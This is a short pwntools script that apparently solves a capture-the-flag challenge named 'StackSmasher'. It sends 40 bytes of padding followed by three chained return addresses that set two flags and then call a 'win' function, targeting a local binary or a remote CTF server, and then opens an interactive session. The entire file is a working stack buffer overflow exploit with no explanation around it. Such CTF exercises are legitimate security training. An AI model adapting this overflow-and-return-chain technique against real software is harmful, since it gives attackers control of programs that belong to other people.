from pwn import *

filePath = './StackSmasher'

def start_process():
    if args.GDB:
        return gdb.debug(filePath, gdbscript='''
            b func
        ''')
    elif args.REMOTE:
        return remote("ctf.mf.grsu.by", 9078)
    else:
        return process(filePath)

p = start_process()

win_addr = 0x0000000000401166
step1_addr = 0x00000000004011a4
step2_addr = 0x00000000004011b5

payload = b'A' * 40
payload += p64(step1_addr) # set first flag
payload += p64(step2_addr) # set second flag
payload += p64(win_addr) # call win function

p.sendline(payload)

p.interactive()
